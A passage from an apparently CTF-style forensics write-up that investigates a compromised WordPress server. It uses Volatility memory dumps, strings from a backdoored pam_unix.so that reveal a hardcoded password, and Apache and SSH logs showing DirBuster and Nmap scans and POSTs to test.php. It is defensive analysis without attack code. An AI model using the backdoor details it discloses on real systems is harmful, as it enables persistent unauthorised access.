</span></span><span class=line><span class=cl>$ vol.py --plugins<span class=o>=</span>../plug_vol/ --profile<span class=o>=</span>LinuxOdie_profilex64 -f memory.dmp linux_find_file -i 0xffff97967660c228 -O pam_unix.so.swp
</span></span><span class=line><span class=cl>$ md5sum pam_unix.so*
</span></span><span class=line><span class=cl>bdeb3146f66059b44c03522414497e2a  pam_unix.so
</span></span><span class=line><span class=cl>3f6a3cec7fc05d66d269d10614e4c20b  pam_unix.so.swp
</span></span></code></pre></td></tr></table></div></div><p>It&rsquo;s true, doing md5 comparaison between two files extracted from memory is not really relevent. Who knows, it could have been useful.
After a brief analysis of their strings, <code>PlopPlop1337</code> is found in <code>pam_unix.so</code> library. It is true, we have located the backdoor! Champagne!</p><p>Another string caught my attention:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ strings pam_unix.so <span class=p>|</span> less
</span></span><span class=line><span class=cl><span class=o>[</span>...<span class=o>]</span>
</span></span><span class=line><span class=cl>libc.so.6
</span></span><span class=line><span class=cl>pam_unix.so
</span></span><span class=line><span class=cl>/home/monique/T
</span></span><span class=line><span class=cl>chargements/ironmaiden/linux-pam-backdoor-master/Linux-PAM-1.1.8/libpam/.libs:/lib64
</span></span><span class=line><span class=cl>GLIBC_2.2.5
</span></span><span class=line><span class=cl>LIBPAM_EXTENSION_1.0
</span></span><span class=line><span class=cl><span class=o>[</span>...<span class=o>]</span>
</span></span></code></pre></td></tr></table></div></div><p>Obviously, the bad hacker is called <code>Monique</code>! This string is here because the bad girl compiled the PAM backdoor on her machine and not on Odie&rsquo;s web server.</p><p>There are several things to consider:</p><ul><li>If there is a PAM backdoor, then Monique got <strong>root</strong> rights ;</li><li>On a web server, the entrypoint must be the website ;</li><li>Even if the web site got pwned, Monique did one or more privilege escalation.</li></ul><h3 id=entrypoint>Entrypoint</h3><p>Ok, me and Odie found the backdoor. But if we remove it without finding the entry point, then Monique will be able to install her backdoor again and again, without any problems.</p><p>Let&rsquo;s focus on the web server. First of all, finding Apache2 logs:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ cat pfile_list<span class=p>|</span> grep <span class=s1>&#39;/var/log/apache2&#39;</span>
</span></span><span class=line><span class=cl>          <span class=m>529847</span> 0xffff9796ba37d228 /bin/bin/var/log/apache2
</span></span><span class=line><span class=cl>          <span class=m>530134</span> 0xffff9796b95a23e8 /bin/bin/var/log/apache2/access.log.swp
</span></span><span class=line><span class=cl>          <span class=m>530135</span> 0xffff9796b954b698 /bin/bin/var/log/apache2/other_vhosts_access.log
</span></span><span class=line><span class=cl>          <span class=m>530133</span> 0xffff9796b95a2c48 /bin/bin/var/log/apache2/error.log
</span></span></code></pre></td></tr></table></div></div><p>Monique must be a really nice girl. She did backups before removing something. Or she is just a bit stupid and don&rsquo;t know how to really clean her traces :D</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=https://media.giphy.com/media/33iqmp5ATXT5m/giphy.gif data-srcset="https://media.giphy.com/media/33iqmp5ATXT5m/giphy.gif, https://media.giphy.com/media/33iqmp5ATXT5m/giphy.gif 1.5x, https://media.giphy.com/media/33iqmp5ATXT5m/giphy.gif 2x" data-sizes=auto alt=https://media.giphy.com/media/33iqmp5ATXT5m/giphy.gif title=https://media.giphy.com/media/33iqmp5ATXT5m/giphy.gif></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ vol.py --plugins<span class=o>=</span>../plug_vol/ --profile<span class=o>=</span>LinuxOdie_profilex64 -f memory.dmp linux_find_file -i 0xffff9796b95a23e8 -O access.log.swp
</span></span><span class=line><span class=cl>$ cat access.log.swp <span class=p>|</span> grep <span class=m>158</span> <span class=p>|</span> ccze -A <span class=p>|</span> less -I
</span></span></code></pre></td></tr></table></div></div><p>Pro tip: when you have to read large Apache2 logs, and you don&rsquo;t have super cyber SIEM 4.0, you got <code>ccze</code>. It will colorize the output and will gives this result:</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/articles/realgsmoveinsilencelikelasagna/blue_3.png data-srcset="/lib/images/articles/realgsmoveinsilencelikelasagna/blue_3.png, /lib/images/articles/realgsmoveinsilencelikelasagna/blue_3.png 1.5x, /lib/images/articles/realgsmoveinsilencelikelasagna/blue_3.png 2x" data-sizes=auto alt=/lib/images/articles/realgsmoveinsilencelikelasagna/blue_3.png title=/lib/images/articles/realgsmoveinsilencelikelasagna/blue_3.png></p><p>Odie sees a beautiful little <em>User-Agent</em>: <code>DirBuster-1.0-RC1 (http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)</code></p><p><code>DirBuster</code> is a Java tool provided by OWASP, it allows a pentester to bruteforce filenames and directories of a web server according to preset wordlist.</p><p>Monique IP address tried to find filenames and directories with this tool. Let&rsquo;s count together most visited web pages:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ cat access.log.swp <span class=p>|</span> awk <span class=s1>&#39;{print $7}&#39;</span> <span class=p>|</span> sort <span class=p>|</span> uniq -c <span class=p>|</span> grep -v <span class=s1>&#39; 1 &#39;</span>
</span></span><span class=line><span class=cl>    <span class=m>11</span> /
</span></span><span class=line><span class=cl>      <span class=m>5</span> /favicon.ico
</span></span><span class=line><span class=cl>      <span class=m>2</span> /icons/
</span></span><span class=line><span class=cl>      <span class=m>4</span> /index.php
</span></span><span class=line><span class=cl>      <span class=m>2</span> /index.php/2018/12/27/eddie-the-head/
</span></span><span class=line><span class=cl>      <span class=m>6</span> /test.php
</span></span><span class=line><span class=cl>     <span class=m>23</span> /wp-admin/admin-ajax.php
</span></span><span class=line><span class=cl>      <span class=m>2</span> /wp-admin/js/media-upload.min.js?ver<span class=o>=</span>5.0.2
</span></span><span class=line><span class=cl>      <span class=m>3</span> /wp-admin/themes.php
</span></span><span class=line><span class=cl>      <span class=m>2</span> /wp-content/
</span></span><span class=line><span class=cl>     <span class=m>12</span> /wp-content/themes/my-music-band/assets/css/font-awesome/css/blocks.css?ver<span class=o>=</span>1.0
</span></span><span class=line><span class=cl>      <span class=m>2</span> /wp-content/themes/my-music-band/assets/css/font-awesome/css/font-awesome.css
</span></span><span class=line><span class=cl>     <span class=m>10</span> /wp-content/themes/my-music-band/assets/css/font-awesome/css/font-awesome.css?ver<span class=o>=</span>4.7.0
</span></span><span class=line><span class=cl>      <span class=m>6</span> /wp-content/themes/my-music-band/assets/css/font-awesome/fonts/fontawesome-webfont.woff2?v<span class=o>=</span>4.7.0
</span></span><span class=line><span class=cl>      <span class=m>2</span> /wp-content/themes/my-music-band/assets/js/customize-preview.min.js?ver<span class=o>=</span><span class=m>20180103</span>
</span></span><span class=line><span class=cl>     <span class=m>10</span> /wp-content/themes/my-music-band/assets/js/fitvids.min.js?ver<span class=o>=</span>1.1
</span></span><span class=line><span class=cl>     <span class=m>10</span> /wp-content/themes/my-music-band/assets/js/functions.min.js?ver<span class=o>=</span><span class=m>201800703</span>
</span></span><span class=line><span class=cl>     <span class=m>10</span> /wp-content/themes/my-music-band/assets/js/skip-link-focus-fix.min.js?ver<span class=o>=</span><span class=m>201800703</span>
</span></span><span class=line><span class=cl>      <span class=m>2</span> /wp-content/themes/my-music-band/inc/metabox/metabox.js?ver<span class=o>=</span><span class=m>20180103</span>
</span></span><span class=line><span class=cl>      <span class=m>2</span> /wp-content/themes/my-music-band/screenshot.png
</span></span><span class=line><span class=cl>     <span class=m>10</span> /wp-content/themes/my-music-band/style.css?ver<span class=o>=</span>5.0.2
</span></span><span class=line><span class=cl>      <span class=m>2</span> /wp-content/themes/rock-band/assets/images/header-image.jpg
</span></span><span class=line><span class=cl>      <span class=m>2</span> /wp-content/themes/rock-band/screenshot.png
</span></span><span class=line><span class=cl>     <span class=m>10</span> /wp-content/themes/rock-band/style.css?ver<span class=o>=</span>5.0.2
</span></span><span class=line><span class=cl>     <span class=m>10</span> /wp-content/uploads/2018/12/ironmaiden_band.jpg
</span></span><span class=line><span class=cl>      <span class=m>5</span> /wp-content/uploads/2018/12/ironmaiden_eddie.jpg
</span></span><span class=line><span class=cl>      <span class=m>3</span> /wp-includes/css/dist/block-library/style.min.css?ver<span class=o>=</span>5.0.2
</span></span><span class=line><span class=cl>      <span class=m>3</span> /wp-includes/css/dist/block-library/theme.min.css?ver<span class=o>=</span>5.0.2
</span></span><span class=line><span class=cl>      <span class=m>2</span> /wp-includes/fonts/dashicons.eot
</span></span><span class=line><span class=cl>      <span class=m>2</span> /wp-includes/js/customize-base.min.js?ver<span class=o>=</span>5.0.2
</span></span><span class=line><span class=cl>      <span class=m>3</span> /wp-includes/js/jquery/jquery.js?ver<span class=o>=</span>1.12.4
</span></span><span class=line><span class=cl>      <span class=m>3</span> /wp-includes/js/jquery/jquery-migrate.min.js?ver<span class=o>=</span>1.4.1
</span></span><span class=line><span class=cl>      <span class=m>2</span> /wp-includes/js/tinymce/plugins/compat3x/plugin.min.js?ver<span class=o>=</span>4800-20180716
</span></span><span class=line><span class=cl>      <span class=m>2</span> /wp-includes/js/tinymce/tinymce.min.js?ver<span class=o>=</span>4800-20180716
</span></span><span class=line><span class=cl>      <span class=m>2</span> /wp-includes/js/underscore.min.js?ver<span class=o>=</span>1.8.3
</span></span><span class=line><span class=cl>      <span class=m>3</span> /wp-includes/js/wp-a11y.min.js?ver<span class=o>=</span>5.0.2
</span></span><span class=line><span class=cl>      <span class=m>3</span> /wp-includes/js/wp-embed.min.js?ver<span class=o>=</span>5.0.2
</span></span><span class=line><span class=cl>      <span class=m>3</span> /wp-includes/js/wp-emoji-release.min.js?ver<span class=o>=</span>5.0.2
</span></span><span class=line><span class=cl>      <span class=m>4</span> /wp-login.php
</span></span></code></pre></td></tr></table></div></div><p>Now, let&rsquo;s exclude WordPress files, they really seem to be legit and up to date (for the moment). And let me add some displayed data:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ cat access.log.swp <span class=p>|</span> awk <span class=s1>&#39;{print $1 $6 $7}&#39;</span> <span class=p>|</span> sort <span class=p>|</span> uniq -c <span class=p>|</span> grep -v <span class=s1>&#39;wp&#39;</span> <span class=p>|</span> grep -v <span class=s1>&#39; 1 &#39;</span>   
</span></span><span class=line><span class=cl>      <span class=m>2</span> 127.0.0.1<span class=s2>&#34;GET/test.php
</span></span></span><span class=line><span class=cl><span class=s2>      3 192.168.122.158&#34;</span>GET/
</span></span><span class=line><span class=cl>      <span class=m>2</span> 192.168.122.158<span class=s2>&#34;GET/favicon.ico
</span></span></span><span class=line><span class=cl><span class=s2>      3 192.168.122.158&#34;</span>HEAD/
</span></span><span class=line><span class=cl>      <span class=m>5</span> 192.168.122.1<span class=s2>&#34;GET/
</span></span></span><span class=line><span class=cl><span class=s2>      3 192.168.122.1&#34;</span>GET/favicon.ico
</span></span><span class=line><span class=cl>      <span class=m>2</span> 192.168.122.1<span class=s2>&#34;GET/index.php/2018/12/27/eddie-the-head/
</span></span></span><span class=line><span class=cl><span class=s2>      3 192.168.122.1&#34;</span>POST/test.php
</span></span></code></pre></td></tr></table></div></div><p>The IPs for <code>test.php</code> do not seem to come from Monique. However, the apache log file seems to be truncated:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ cat access.log.swp<span class=p>|</span> tail -n <span class=m>4</span>                            
</span></span><span class=line><span class=cl>192.168.122.158 - - <span class=o>[</span>27/Dec/2018:19:50:32 +0100<span class=o>]</span> <span class=s2>&#34;HEAD /traffic.php HTTP/1.1&#34;</span> <span class=m>404</span> <span class=m>140</span> <span class=s2>&#34;-&#34;</span> <span class=s2>&#34;DirBuster-1.0-RC1 (http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)&#34;</span>
</span></span><span class=line><span class=cl>192.168.122.158 - - <span class=o>[</span>27/Dec/2018:19:50:32 +0100<span class=o>]</span> <span class=s2>&#34;HEAD /thumbs.php HTTP/1.1&#34;</span> <span class=m>404</span> <span class=m>140</span> <span class=s2>&#34;-&#34;</span> <span class=s2>&#34;DirBuster-1.0-RC1 (http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)&#34;</span>
</span></span><span class=line><span class=cl>192.168.122.158 - - <span class=o>[</span>27/Dec/2018:19:50:32 +0100<span class=o>]</span> <span class=s2>&#34;HEAD /65.php HTTP/1.1&#34;</span> <span class=m>404</span> <span class=m>140</span> <span class=s2>&#34;-&#34;</span> <span class=s2>&#34;DirBuster-1.0-RC1 (http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)&#34;</span>
</span></span><span class=line><span class=cl>192.168.122.158 - - <span class=o>[</span>27/Dec/2018:19:50:32 +0100<span class=o>]</span> <span class=s2>&#34;HEAD /topic/ HTTP/1.1&#34;</span> <span class=m>404</span> <span class=m>140</span> <span class=s2>&#34;-&#34;</span> <span class=s2>&#34;DirBuster-1.0-RC1 (http://%
</span></span></span></code></pre></td></tr></table></div></div><p>Unfortunately, there is no <code>.bash_history</code> for the user <strong>www-data</strong>. We have to find another way to find out what Monique did with this site.</p><p>After searching for several hours, Odie reminds me that he still has access to his VPS, let&rsquo;s see what we can get from it. If there is any additional information in the VPS log files:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>webserver $ cat ../auth.log <span class=p>|</span> grep <span class=m>158</span>
</span></span><span class=line><span class=cl>Dec <span class=m>27</span> 19:58:33 webserver sshd<span class=o>[</span>21592<span class=o>]</span>: Did not receive identification string from 192.168.122.158 port <span class=m>35782</span>
</span></span><span class=line><span class=cl>Dec <span class=m>27</span> 21:17:03 webserver sshd<span class=o>[</span>21871<span class=o>]</span>: Connection closed by 192.168.122.158 port <span class=m>36434</span> <span class=o>[</span>preauth<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=o>[</span>...<span class=o>]</span>
</span></span><span class=line><span class=cl>Dec <span class=m>27</span> 21:49:51 webserver sshd<span class=o>[</span>22149<span class=o>]</span>: Disconnected from 192.168.122.158 port <span class=m>36538</span>
</span></span><span class=line><span class=cl>Dec <span class=m>27</span> 22:23:44 webserver sshd<span class=o>[</span>22335<span class=o>]</span>: Accepted password <span class=k>for</span> odie from 192.168.122.158 port <span class=m>36736</span> ssh2
</span></span><span class=line><span class=cl>Dec <span class=m>28</span> 00:52:47 webserver sshd<span class=o>[</span>24179<span class=o>]</span>: Accepted password <span class=k>for</span> odie from 192.168.122.158 port <span class=m>37392</span> ssh2
</span></span></code></pre></td></tr></table></div></div><p>The first connection seems to have been established the <code>27/12 at 19:58:33</code> and the last the <code>28/12 at 00:52:47</code>. The last connection is the one that appears during Odie&rsquo;s <code>ss</code>.</p><p>If I apply a filter on the first schedule in Apache2 logs, <code>access.log</code>, we can get interesting things:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>webserver $ cat access.log <span class=p>|</span> grep <span class=s2>&#34;19:58&#34;</span>
</span></span><span class=line><span class=cl>192.168.122.158 - - <span class=o>[</span>27/Dec/2018:19:58:39 +0100<span class=o>]</span> <span class=s2>&#34;GET / HTTP/1.0&#34;</span> <span class=m>200</span> <span class=m>17847</span> <span class=s2>&#34;-&#34;</span> <span class=s2>&#34;-&#34;</span>
</span></span><span class=line><span class=cl>192.168.122.158 - - <span class=o>[</span>27/Dec/2018:19:58:40 +0100<span class=o>]</span> <span class=s2>&#34;POST /sdk HTTP/1.1&#34;</span> <span class=m>404</span> <span class=m>462</span> <span class=s2>&#34;-&#34;</span> <span class=s2>&#34;Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)&#34;</span>
</span></span><span class=line><span class=cl>192.168.122.158 - - <span class=o>[</span>27/Dec/2018:19:58:40 +0100<span class=o>]</span> <span class=s2>&#34;GET /nmaplowercheck1545937121 HTTP/1.1&#34;</span> <span class=m>404</span> <span class=m>483</span> <span class=s2>&#34;-&#34;</span> <span class=s2>&#34;Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)&#34;</span>
</span></span><span class=line><span class=cl>192.168.122.158 - - <span class=o>[</span>27/Dec/2018:19:58:40 +0100<span class=o>]</span> <span class=s2>&#34;GET /evox/about HTTP/1.1&#34;</span> <span class=m>404</span> <span class=m>469</span> <span class=s2>&#34;-&#34;</span> <span class=s2>&#34;Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)&#34;</span>
</span></span><span class=line><span class=cl>192.168.122.158 - - <span class=o>[</span>27/Dec/2018:19:58:40 +0100<span class=o>]</span> <span class=s2>&#34;GET /HNAP1 HTTP/1.1&#34;</span> <span class=m>404</span> <span class=m>464</span> <span class=s2>&#34;-&#34;</span> <span class=s2>&#34;Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)&#34;</span>
</span></span><span class=line><span class=cl>192.168.122.158 - - <span class=o>[</span>27/Dec/2018:19:58:40 +0100<span class=o>]</span> <span class=s2>&#34;GET / HTTP/1.0&#34;</span> <span class=m>200</span> <span class=m>17847</span> <span class=s2>&#34;-&#34;</span> <span class=s2>&#34;-&#34;</span>
</span></span><span class=line><span class=cl>192.168.122.158 - - <span class=o>[</span>27/Dec/2018:19:58:40 +0100<span class=o>]</span> <span class=s2>&#34;GET / HTTP/1.1&#34;</span> <span class=m>200</span> <span class=m>17095</span> <span class=s2>&#34;-&#34;</span> <span class=s2>&#34;-&#34;</span>
</span></span><span class=line><span class=cl>192.168.122.158 - - <span class=o>[</span>27/Dec/2018:19:58:58 +0100<span class=o>]</span> <span class=s2>&#34;POST /test.php HTTP/1.1&#34;</span> <span class=m>200</span> <span class=m>927</span> <span class=s2>&#34;http://192.168.122.216/test.php&#34;</span> <span class=s2>&#34;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0&#34;</span>
</span></span><span class=line><span class=cl>192.168.122.158 - - <span class=o>[</span>27/Dec/2018:19:58:58 +0100<span class=o>]</span> <span class=s2>&#34;GET /favicon.ico HTTP/1.1&#34;</span> <span class=m>404</span> <span class=m>506</span> <span class=s2>&#34;-&#34;</span> <span class=s2>&#34;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>webserver $ cat access.log <span class=p>|</span> grep <span class=s2>&#34;19:58&#34;</span> <span class=p>|</span> grep -v <span class=s1>&#39;Nmap&#39;</span>
</span></span><span class=line><span class=cl>192.168.122.158 - - <span class=o>[</span>27/Dec/2018:19:58:39 +0100<span class=o>]</span> <span class=s2>&#34;GET / HTTP/1.0&#34;</span> <span class=m>200</span> <span class=m>17847</span> <span class=s2>&#34;-&#34;</span> <span class=s2>&#34;-&#34;</span>
</span></span><span class=line><span class=cl>192.168.122.158 - - <span class=o>[</span>27/Dec/2018:19:58:40 +0100<span class=o>]</span> <span class=s2>&#34;GET / HTTP/1.0&#34;</span> <span class=m>200</span> <span class=m>17847</span> <span class=s2>&#34;-&#34;</span> <span class=s2>&#34;-&#34;</span>
</span></span><span class=line><span class=cl>192.168.122.158 - - <span class=o>[</span>27/Dec/2018:19:58:40 +0100<span class=o>]</span> <span class=s2>&#34;GET / HTTP/1.1&#34;</span> <span class=m>200</span> <span class=m>17095</span> <span class=s2>&#34;-&#34;</span> <span class=s2>&#34;-&#34;</span>
</span></span><span class=line><span class=cl>192.168.122.158 - - <span class=o>[</span>27/Dec/2018:19:58:58 +0100<span class=o>]</span> <span class=s2>&#34;POST /test.php HTTP/1.1&#34;</span> <span class=m>200</span> <span class=m>927</span> <span class=s2>&#34;http://192.168.122.216/test.php&#34;</span> <span class=s2>&#34;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0&#34;</span>
</span></span><span class=line><span class=cl>192.168.122.158 - - <span class=o>[</span>27/Dec/2018:19:58:58 +0100<span class=o>]</span> <span class=s2>&#34;GET /favicon.ico HTTP/1.1&#34;</span> <span class=m>404</span> <span class=m>506</span> <span class=s2>&#34;-&#34;</span> <span class=s2>&#34;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0&#34;</span>
</span></span></code></pre></td></tr></table></div></div><p>As we can see, <code>test.php</code> file was called in the same minute, but it&rsquo;s a POST request, with a standard User-Agent. The attacker probably wanted to test something.</p><p>In filtering on &ldquo;158&rdquo; (Monique IP address suffix), &ldquo;test.php&rdquo; and removing all garbage request due to Nmap and DirBuster, we can find this:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>webserver $ cat access.log <span class=p>|</span> grep <span class=m>158</span> <span class=p>|</span> grep -A <span class=m>4</span> test.php <span class=p>|</span> grep -v -E <span class=s2>&#34;DirBuster|Nmap&#34;</span>
</span></span><span class=line><span class=cl>192.168.122.158 - - <span class=o>[</span>27/Dec/2018:19:50:43 +0100<span class=o>]</span> <span class=s2>&#34;GET /test.php HTTP/1.1&#34;</span> <span class=m>200</span> <span class=m>415</span> <span class=s2>&#34;-&#34;</span> <span class=s2>&#34;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0&#34;</span>
</span></span><span class=line><span class=cl>192.168.122.158 - - <span class=o>[</span>27/Dec/2018:19:50:43 +0100<span class=o>]</span> <span class=s2>&#34;GET /favicon.ico HTTP/1.1&#34;</span> <span class=m>404</span> <span class=m>506</span> <span class=s2>&#34;-&#34;</span> <span class=s2>&#34;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0&#34;</span>
</span></span><span class=line><span class=cl>192.168.122.158 - - <span class=o>[</span>27/Dec/2018:19:50:51 +0100<span class=o>]</span> <span class=s2>&#34;POST /test.php HTTP/1.1&#34;</span> <span class=m>200</span> <span class=m>445</span> <span class=s2>&#34;http://192.168.122.216/test.php&#34;</span> <span class=s2>&#34;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0&#34;</span>
</span></span><span class=line><span class=cl>192.168.122.158 - - <span class=o>[</span>27/Dec/2018:19:50:51 +0100<span class=o>]</span> <span class=s2>&#34;GET /favicon.ico HTTP/1.1&#34;</span> <span class=m>404</span> <span class=m>506</span> <span class=s2>&#34;-&#34;</span> <span class=s2>&#34;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0&#34;</span>
</span></span><span class=line><span class=cl>192.168.122.158 - - <span class=o>[</span>27/Dec/2018:19:51:00 +0100<span class=o>]</span> <span class=s2>&#34;POST /test.php HTTP/1.1&#34;</span> <span class=m>200</span> <span class=m>437</span> <span class=s2>&#34;http://192.168.122.216/test.php&#34;</span> <span class=s2>&#34;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0&#34;</span>
</span></span><span class=line><span class=cl>192.168.122.158 - - <span class=o>[</span>27/Dec/2018:19:51:00 +0100<span class=o>]</span> <span class=s2>&#34;GET /favicon.ico HTTP/1.1&#34;</span> <span class=m>404</span> <span class=m>506</span> <span class=s2>&#34;-&#34;</span> <span class=s2>&#34;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0&#34;</span>
</span></span><span class=line><span class=cl>192.168.122.158 - - <span class=o>[</span>27/Dec/2018:19:51:07 +0100<span class=o>]</span> <span class=s2>&#34;POST /test.php HTTP/1.1&#34;</span> <span class=m>200</span> <span class=m>442</span> <span class=s2>&#34;http://192.168.122.216/test.php&#34;</span> <span class=s2>&#34;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0&#34;</span>
</span></span><span class=line><span class=cl>192.168.122.158 - - <span class=o>[</span>27/Dec/2018:19:51:07 +0100<span class=o>]</span> <span class=s2>&#34;GET /favicon.ico HTTP/1.1&#34;</span> <span class=m>404</span> <span class=m>506</span> <span class=s2>&#34;-&#34;</span> <span class=s2>&#34;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0&#34;</span>
</span></span><span class=line><span class=cl>192.168.122.158 - - <span class=o>[</span>27/Dec/2018:19:51:17 +0100<span class=o>]</span> <span class=s2>&#34;POST /test.php HTTP/1.1&#34;</span> <span class=m>200</span> <span class=m>447</span> <span class=s2>&#34;http://192.168.122.216/test.php&#34;</span> <span class=s2>&#34;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0&#34;</span>
</span></span><span class=line><span class=cl>192.168.122.158 - - <span class=o>[</span>27/Dec/2018:19:51:17 +0100<span class=o>]</span> <span class=s2>&#34;GET /favicon.ico HTTP/1.1&#34;</span> <span class=m>404</span> <span class=m>506</span> <span class=s2>&#34;-&#34;</span> <span class=s2>&#34;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0&#34;</span>
</span></span><span class=line><span class=cl>192.168.122.158 - - <span class=o>[</span>27/Dec/2018:19:51:32 +0100<span class=o>]</span> <span class=s2>&#34;POST /test.php HTTP/1.1&#34;</span> <span class=m>200</span> <span class=m>600</span> <span class=s2>&#34;http://192.168.122.216/test.php&#34;</span> <span class=s2>&#34;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0&#34;</span>
